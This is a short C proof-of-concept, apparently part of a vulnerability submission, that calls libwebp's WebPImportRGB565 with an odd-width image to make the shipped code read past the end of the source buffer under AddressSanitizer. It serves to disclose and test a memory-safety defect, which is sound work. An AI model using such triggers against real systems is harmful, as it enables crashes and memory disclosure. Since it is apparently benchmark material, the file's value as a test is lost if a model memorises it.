// Residual-defect PoC for WebPImportRGB565().
//
// Drives the public extras API (WebPImportRGB565, declared in extras/extras.h)
// with a fully in-contract RGB565 source: pic.width/pic.height are set and the
// source buffer holds exactly 2 * width * height bytes of packed RGB565, as the
// documentation requires. The only thing "crafted" here is the image geometry:
// an odd width. Normal (even-width) images import correctly and safely; an
// odd-width image makes the shipped tree read past the end of the source
// buffer on the final row.
//
// Build (ASan): see cmd in submission.json.

#include <stdlib.h>
#include <stdio.h>

#include "extras/extras.h"
#include "webp/encode.h"

int main(void) {
  const int width = 65;   // odd, in-contract
  const int height = 48;
  const size_t src_size = (size_t)2 * width * height;  // RGB565: 2 bytes/pixel
  uint8_t* rgb565 = (uint8_t*)malloc(src_size);
  WebPPicture pic;
  int ok;

  if (rgb565 == NULL) return 2;
  // Ordinary valid pixel data; values are irrelevant to the fault.
  for (size_t i = 0; i < src_size; ++i) rgb565[i] = (uint8_t)(i * 7 + 1);

  if (!WebPPictureInit(&pic)) { free(rgb565); return 2; }
  pic.width = width;
  pic.height = height;

  ok = WebPImportRGB565(rgb565, &pic);  // <- fault fires here on shipped tree

  WebPPictureFree(&pic);
  free(rgb565);
  printf("WebPImportRGB565 returned %d\n", ok);
  return ok ? 0 : 1;
}
